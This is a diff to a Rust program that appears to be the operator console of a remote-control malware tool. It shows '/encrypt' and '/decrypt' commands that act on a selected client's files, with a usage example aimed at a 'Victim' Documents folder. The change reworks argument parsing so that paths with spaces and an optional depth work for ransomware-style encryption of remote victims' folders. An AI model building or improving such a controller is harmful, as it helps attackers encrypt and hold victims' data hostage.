@@ -973,16 +973,19 @@ async fn main() {
                 }
                 "/encrypt" => {
                     if parts.len() < 2 {
-                        println!("{} /encrypt <ruta> [max_depth]", "❌ Uso:".bright_red());
+                        println!("{}  /encrypt <ruta> [max_depth]", "❌ Uso:".bright_red());
                         println!("   Ejemplo: /encrypt C:\\\\Users\\\\Victim\\\\Documents 5");
                         continue;
                     }
                     
-                    let path = parts[1];
-                    let max_depth = if parts.len() > 2 {
-                        parts[2]
+                    // Extraer path y max_depth correctamente
+                    let args: Vec<&str> = parts[1..].iter().copied().collect();
+                    let (path, max_depth) = if args.len() > 1 && args[args.len() - 1].parse::<u32>().is_ok() {
+                        // Último argumento es un número (max_depth)
+                        (args[..args.len() - 1].join(" ").trim_matches('\"').to_string(), args[args.len() - 1])
                     } else {
-                        "5"
+                        // Sin max_depth, usar todo como path
+                        (args.join(" ").trim_matches('\"').to_string(), "5")
                     };
                     
                     let selected = *selected_client.lock().unwrap();
@@ -1076,13 +1079,28 @@ async fn main() {
                         continue;
                     }
                     
-                    let path = parts[1];
-                    let key = parts[2];
-                    let max_depth = if parts.len() > 3 {
-                        parts[3]
+                    // Parsear argumentos: necesitamos separar path, key y max_depth opcional
+                    // Formato: /decrypt <path> <key> [max_depth]
+                    // El key es una string sin espacios (hash hex)
+                    // max_depth es un número opcional al final
+                    let args: Vec<&str> = parts[1..].iter().copied().collect();
+                    
+                    // Verificar si el último argumento es max_depth (número)
+                    let (path_and_key, max_depth) = if args.len() > 2 && args[args.len() - 1].parse::<u32>().is_ok() {
+                        (&args[..args.len() - 1], args[args.len() - 1])
                     } else {
-                        "5"
+                        (&args[..], "5")
                     };
+                    
+                    // El último elemento de path_and_key es el key (sin espacios)
+                    // Todo lo anterior es el path (puede tener espacios)
+                    if path_and_key.len() < 2 {
+                        println!("{} Debe especificar ruta y clave", "❌ Error:".bright_red());
+                        continue;
+                    }
+                    
+                    let key = path_and_key[path_and_key.len() - 1];
+                    let path = path_and_key[..path_and_key.len() - 1].join(" ").trim_matches('\"').to_string();
                     
                     let selected = *selected_client.lock().unwrap();
                     
